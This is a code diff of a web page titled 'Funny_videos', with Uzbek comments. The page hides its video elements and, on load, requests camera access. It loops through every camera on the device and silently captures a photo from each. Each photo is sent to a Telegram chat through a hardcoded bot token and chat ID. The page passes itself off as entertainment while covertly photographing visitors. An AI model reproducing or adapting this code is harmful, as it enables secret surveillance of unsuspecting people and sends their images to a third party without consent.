@@ -5,16 +5,8 @@
     <title>Funny_videos</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            background: #000;
-            height: 100%;
-            overflow: hidden;
-        }
-        video, canvas {
-            display: none;
-        }
+        html, body { margin:0; padding:0; background:#000; height:100%; overflow:hidden; }
+        video, canvas { display:none; }
     </style>
 </head>
 <body>
@@ -23,32 +15,37 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
-    const CHAT_ID  = "7880376636";
+const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
+const CHAT_ID  = "7880376636";
 
-    function sendToTelegram(blob) {
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        }).catch(err => console.log("Telegram xato"));
-    }
+function sendToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob);
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:formData });
+}
 
-    const cameras = ["user", "environment"]; // old + orqa
+async function getCameras() {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    return devices.filter(d => d.kind === "videoinput");
+}
 
-    function captureCamera(index) {
-        if (index >= cameras.length) return;
+async function captureCamera(index=0) {
+    const cameras = await getCameras();
+    if(index >= cameras.length) return;
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: cameras[index] } })
-        .then(stream => {
-            const video = document.getElementById("video");
-            video.srcObject = stream;
+    const deviceId = cameras[index].deviceId;
 
-            // Video haqiqatdan tayyor bo'lishini kutish
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video:{ deviceId: { exact: deviceId } } });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+            video.play();
+
             function tryCapture() {
-                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                if(video.videoWidth > 0 && video.videoHeight > 0) {
                     const canvas = document.getElementById("canvas");
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -61,15 +58,16 @@
                         captureCamera(index + 1);
                     }, "image/jpeg", 0.9);
                 } else {
-                    requestAnimationFrame(tryCapture); // video tayyor bo‘lguncha kutish
+                    requestAnimationFrame(tryCapture);
                 }
             }
             tryCapture();
-        })
-        .catch(err => console.log("Kameraga ruxsat berilmadi"));
-    }
+        };
+    } catch(e) { console.log("Kamera ochilmadi:", e); }
+}
 
-    captureCamera(0);
+// Ishga tushirish
+captureCamera();
 </script>
 
 </body>
